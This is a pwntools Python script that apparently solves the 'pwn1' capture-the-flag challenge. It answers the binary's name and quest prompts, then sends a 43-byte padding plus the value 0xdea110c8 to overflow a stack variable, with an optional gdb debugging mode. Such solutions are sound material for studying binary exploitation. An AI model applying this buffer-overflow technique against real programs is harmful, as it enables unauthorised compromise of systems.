from pwn import *


import argparse

parser = argparse.ArgumentParser()
#parser.add_argument("--offset", type=int, required=True)
#parser.add_argument("--buffer_offset", type=int, required=True)
parser.add_argument("--debug", action='store_true', help="Enable debugging")
args = parser.parse_args()

context.arch='i386'


if args.debug is True:
    io = process("./pwn1", level="debug")
    gdb.attach(io,'''
        break *(main+313)
    ''')
else:
     io = process("./pwn1")

payload = b"A" * 43
payload += p32(0xdea110c8)  # 0xdea110c8 

io.recvuntil(b"name?\n")
io.sendline(b"Sir Lancelot of Camelot")

io.recvuntil(b"quest?\n")
io.sendline(b"To seek the Holy Grail.")

io.recvuntil(b"secret?\n")


#io.sendline(cyclic(50))
io.sendline(payload)

io.interactive()


